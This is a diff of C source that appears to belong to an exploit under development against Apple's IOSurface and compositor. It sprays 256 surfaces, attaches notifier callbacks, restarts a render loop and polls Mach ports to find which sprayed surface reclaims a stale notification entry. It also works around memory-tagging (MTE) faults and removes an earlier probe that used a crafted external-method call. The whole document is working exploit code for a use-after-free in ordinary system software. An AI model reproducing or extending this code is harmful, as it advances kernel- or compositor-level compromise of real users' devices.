@@ -19761,7 +19761,85 @@ new_modes:
                 int r229_notifier_count = 0;
                 memset(r229_notifiers, 0, sizeof(r229_notifiers));
 
-                if (0) { /* DISABLED: bulk notifier creation crashes — render loop
+                int r229_mte_match = 0;
+                int r229_match_idx = -1;
+
+                /* Render-loop-based identification: create notifiers on all
+                 * surfaces, restart compositor, check which callback fires.
+                 * The compositor traverses stale notification entries and
+                 * dereferences the IOSurface* at +0x58 → matched spray surface.
+                 * With IOSurfaceNotifier callbacks registered, the notification
+                 * dispatch fires our callback, identifying the matched surface. */
+                if (notifier_create_fn && notifier_setq_fn) {
+                    dispatch_queue_t nq = dispatch_queue_create("com.research.notifier", DISPATCH_QUEUE_SERIAL);
+                    r229_notif_fire_count = 0;
+                    r229_notif_last_idx = -1;
+                    for (int si = 0; si < 256; si++) {
+                        if (r229_spray[si]) {
+                            CFTypeRef notif = notifier_create_fn(r229_spray[si],
+                                (void *)r229_notif_callback, (void *)(uintptr_t)si);
+                            if (notif) {
+                                r229_notifiers[si] = notif;
+                                r229_notifier_count++;
+                                notifier_setq_fn(notif, nq);
+                            }
+                        }
+                    }
+                    rlog("  r=229: Created %d IOSurfaceNotifiers\n", r229_notifier_count);
+
+                    p13_render_frames = 0;
+                    p13_render_run = 1;
+                    pthread_t render_id_th;
+                    pthread_create(&render_id_th, NULL, p13_render_loop, NULL);
+                    rlog("  r=229: Render loop restarted for compositor detection\n");
+                    usleep(300000);
+                    p13_render_run = 0;
+                    pthread_join(render_id_th, NULL);
+
+                    int cb_fires = r229_notif_fire_count;
+                    int cb_idx = r229_notif_last_idx;
+
+                    int wp_hits = 0;
+                    for (int wi = 0; wi < r229_wp_n; wi++) {
+                        if (!r229_wps[wi]) continue;
+                        uint8_t mb[512];
+                        mach_msg_header_t *mh = (mach_msg_header_t *)mb;
+                        memset(mb, 0, sizeof(mb));
+                        mh->msgh_size = sizeof(mb);
+                        mh->msgh_local_port = r229_wps[wi];
+                        kern_return_t mr = mach_msg(mh, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                            0, sizeof(mb), r229_wps[wi], 0, MACH_PORT_NULL);
+                        if (mr == MACH_MSG_SUCCESS) {
+                            wp_hits++;
+                            rlog("    WP HIT: port[%d]=%u msgh_id=0x%x\n",
+                                wi, r229_wps[wi], mh->msgh_id);
+                        }
+                    }
+                    rlog("  r=229: cb_fires=%d cb_idx=%d wp_hits=%d\n",
+                        cb_fires, cb_idx, wp_hits);
+
+                    for (int si = 0; si < 256; si++) {
+                        if (r229_notifiers[si]) {
+                            if (notifier_invalidate_fn) notifier_invalidate_fn(r229_notifiers[si]);
+                            CFRelease(r229_notifiers[si]);
+                            r229_notifiers[si] = NULL;
+                        }
+                    }
+                    dispatch_release(nq);
+                    r229_notifier_count = 0;
+
+                    if (cb_fires > 0 && cb_idx >= 0 && cb_idx < 256) {
+                        rlog("  r=229: *** CALLBACK MATCH: spray[%d] id=%u ***\n",
+                            cb_idx,
+                            r229_spray[cb_idx] ? IOSurfaceGetID(r229_spray[cb_idx]) : 0);
+                        r229_mte_match = 1;
+                        r229_match_idx = cb_idx;
+                        goto r229_match_done;
+                    }
+                    rlog("  r=229: No callback match — falling through\n");
+                }
+
+                if (0) { /* DISABLED: original bulk notifier + binary search path
                           * triggers compositor traversal of stale entries, causing
                           * MTE fault. Use sequential probe in Phase 14 instead. */
                     dispatch_queue_t nq = dispatch_queue_create("com.research.notifier", DISPATCH_QUEUE_SERIAL);
@@ -19967,9 +20045,6 @@ new_modes:
                 for (int si = 0; si < 256; si++) {
                     r229_ids[si] = r229_spray[si] ? IOSurfaceGetID(r229_spray[si]) : 0;
                 }
-
-                int r229_mte_match = 0;
-                int r229_match_idx = -1;
 
                 /* Reset binary search to full range on phase 2 (confirmed match was previous race) */
                 if (r229_phase == 2) {
@@ -20304,13 +20379,9 @@ new_modes:
                     int total_uc_anomalies = 0;
                     int baseline_uc_delta = -999;
 
-                    io_service_t id_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
-                        IOServiceMatching("IOSurfaceRoot"));
-
                     for (int si = 0; si < 256; si++) {
                         if (!r229_spray_static[si]) continue;
 
-                        IOSurfaceID sid = IOSurfaceGetID(r229_spray_static[si]);
                         int uc_before = IOSurfaceGetUseCount(r229_spray_static[si]);
 
                         /* Create ONE notifier on this surface */
@@ -20322,34 +20393,15 @@ new_modes:
                         if (!notif) { dispatch_release(idq); continue; }
                         nsq_fn(notif, idq);
 
-                        /* Open fresh connection and register sel17 to trigger traversal */
-                        io_connect_t id_conn = IO_OBJECT_NULL;
-                        mach_port_t id_wp = MACH_PORT_NULL;
-                        if (id_svc != IO_OBJECT_NULL) {
-                            IOServiceOpen(id_svc, mach_task_self(), 0, &id_conn);
-                            if (id_conn != IO_OBJECT_NULL) {
-                                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &id_wp);
-                                mach_port_insert_right(mach_task_self(), id_wp, id_wp, MACH_MSG_TYPE_MAKE_SEND);
-                                uint64_t ref_id = 0x1D000000ULL | (uint64_t)si;
-                                uint8_t inp_id[24];
-                                memset(inp_id, 0, sizeof(inp_id));
-                                uint32_t sid32 = sid;
-                                memcpy(inp_id, &sid32, 4);
-                                IOConnectCallAsyncMethod(id_conn, 17, id_wp, &ref_id, 1,
-                                    NULL, 0, inp_id, 24, NULL, NULL, NULL, NULL);
-                            }
-                        }
-
-                        /* Also trigger property change to exercise notification paths */
+                        /* Trigger property change */
                         int marker = 0xCAFE0000 | si;
                         CFNumberRef mv = CFNumberCreate(NULL, kCFNumberIntType, &marker);
                         IOSurfaceSetValue(r229_spray_static[si], CFSTR("_id_probe"), mv);
                         CFRelease(mv);
                         IOSurfaceRemoveValue(r229_spray_static[si], CFSTR("_id_probe"));
 
-                        usleep(20000); /* 20ms — enough for notification dispatch */
+                        usleep(5000); /* 5ms */
 
-                        /* Check use count */
                         int uc_after = IOSurfaceGetUseCount(r229_spray_static[si]);
                         int delta = uc_after - uc_before;
 
@@ -20357,75 +20409,46 @@ new_modes:
                             baseline_uc_delta = delta;
                         } else if (delta != baseline_uc_delta) {
                             total_uc_anomalies++;
-                            rlog("    *** UC ANOMALY spray[%d] uc: %d->%d (delta=%d, baseline=%d) ***\n",
-                                si, uc_before, uc_after, delta, baseline_uc_delta);
+                            rlog("    *** UC ANOMALY spray[%d] delta=%d baseline=%d ***\n",
+                                si, delta, baseline_uc_delta);
                             if (found_idx < 0) found_idx = si;
                         }
 
-                        /* Check ALL saved wake ports for messages */
+                        /* Check saved wake ports (non-blocking) */
                         int wp_hits_this = 0;
                         for (int wi = 0; wi < r229_saved_wp_n; wi++) {
                             if (!r229_saved_wps[wi]) continue;
-                            uint8_t msg_buf[512];
+                            uint8_t msg_buf[256];
                             mach_msg_header_t *hdr = (mach_msg_header_t *)msg_buf;
                             memset(msg_buf, 0, sizeof(msg_buf));
                             hdr->msgh_size = sizeof(msg_buf);
                             hdr->msgh_local_port = r229_saved_wps[wi];
                             kern_return_t mr = mach_msg(hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
-                                0, sizeof(msg_buf), r229_saved_wps[wi], 5, MACH_PORT_NULL);
+                                0, sizeof(msg_buf), r229_saved_wps[wi], 0, MACH_PORT_NULL);
                             if (mr == MACH_MSG_SUCCESS) {
                                 wp_hits_this++;
                                 total_wp_hits++;
-                                rlog("    *** WP HIT spray[%d] saved_wp[%d] port=%u msgh_id=0x%x ***\n",
-                                    si, wi, r229_saved_wps[wi], hdr->msgh_id);
+                                rlog("    *** WP HIT spray[%d] saved_wp[%d] port=%u ***\n",
+                                    si, wi, r229_saved_wps[wi]);
                             }
                         }
 
-                        /* Also check the fresh id_wp */
-                        if (id_wp != MACH_PORT_NULL) {
-                            uint8_t msg_buf[512];
-                            mach_msg_header_t *hdr = (mach_msg_header_t *)msg_buf;
-                            memset(msg_buf, 0, sizeof(msg_buf));
-                            hdr->msgh_size = sizeof(msg_buf);
-                            hdr->msgh_local_port = id_wp;
-                            kern_return_t mr = mach_msg(hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
-                                0, sizeof(msg_buf), id_wp, 5, MACH_PORT_NULL);
-                            if (mr == MACH_MSG_SUCCESS) {
-                                wp_hits_this++;
-                                rlog("    *** FRESH WP HIT spray[%d] port=%u msgh_id=0x%x ***\n",
-                                    si, id_wp, hdr->msgh_id);
-                            }
-                        }
-
-                        /* Check callback fire count */
                         int cb_fires = r229_notif_fire_count;
 
-                        if (wp_hits_this > 0 && found_idx < 0) {
-                            found_idx = si;
-                        }
+                        if (wp_hits_this > 0 && found_idx < 0) found_idx = si;
+                        if (cb_fires > 0 && found_idx < 0) found_idx = si;
 
-                        /* Clean up */
                         ni_fn(notif);
                         CFRelease(notif);
                         dispatch_release(idq);
-                        if (id_conn != IO_OBJECT_NULL) {
-                            IOServiceClose(id_conn);
-                        }
-                        if (id_wp != MACH_PORT_NULL) {
-                            mach_port_deallocate(mach_task_self(), id_wp);
-                        }
 
                         int is_notable = (wp_hits_this > 0 || delta != baseline_uc_delta || cb_fires > 0);
-
-                        /* Progress logging */
                         if (si < 3 || si % 32 == 0 || si == 255 || is_notable) {
                             rlog("    probe[%d/255] uc_delta=%d wp=%d cb=%d%s\n",
                                 si, delta, wp_hits_this, cb_fires,
                                 is_notable ? " <<<" : "");
                         }
                     }
-
-                    if (id_svc != IO_OBJECT_NULL) IOObjectRelease(id_svc);
 
                     rlog("    Sequential probe complete: wp_hits=%d uc_anomalies=%d found=%d\n",
                         total_wp_hits, total_uc_anomalies, found_idx);
